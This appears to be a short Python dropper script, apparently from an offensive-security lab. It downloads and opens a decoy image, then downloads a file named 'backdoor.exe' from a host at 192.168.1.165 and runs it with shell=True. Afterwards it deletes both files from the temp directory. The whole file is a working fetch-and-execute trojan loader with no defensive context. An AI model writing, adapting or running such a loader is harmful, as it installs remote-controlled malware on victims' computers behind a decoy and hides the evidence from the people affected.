import requests
import subprocess
import os
import tempfile

def download(url):
    get_request = requests.get(url)
    file_name = url.split("/")[-1]
    print(get_request.content)
    with open(file_name, "wb") as out_file:
        out_file.write(get_request.content)

temp_dir = tempfile.gettempdir()
os.chdir(temp_dir)

download("http://192.168.1.165/car.jpg")
result = subprocess.Popen("car.jpg", shell=True)

download("http://192.168.1.165/backdoor.exe")
result = subprocess.call("backdoor.exe", shell=True)

os.remove("car.jpg")
os.remove("backdoor.exe")